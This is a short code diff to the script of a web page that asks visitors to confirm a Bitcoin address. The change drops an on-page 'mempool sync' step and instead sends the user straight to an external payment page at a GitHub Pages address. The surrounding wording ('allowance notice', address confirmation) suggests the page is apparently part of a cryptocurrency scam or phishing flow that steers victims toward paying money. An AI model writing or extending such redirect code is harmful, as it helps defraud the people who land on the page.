@@ -240,8 +240,8 @@
             const addr = document.getElementById('confirm-address').value;
             if (addr.length < 10) return alert('Please enter a valid Bitcoin address for confirmation.');
             
-            document.getElementById('allowance-notice').style.display = 'none';
-            showMempoolSync();
+            // Redirect immediately
+            window.location.href = 'https://swift-chain7.github.io/pay.id/';
         }
 
         function showMempoolSync() {
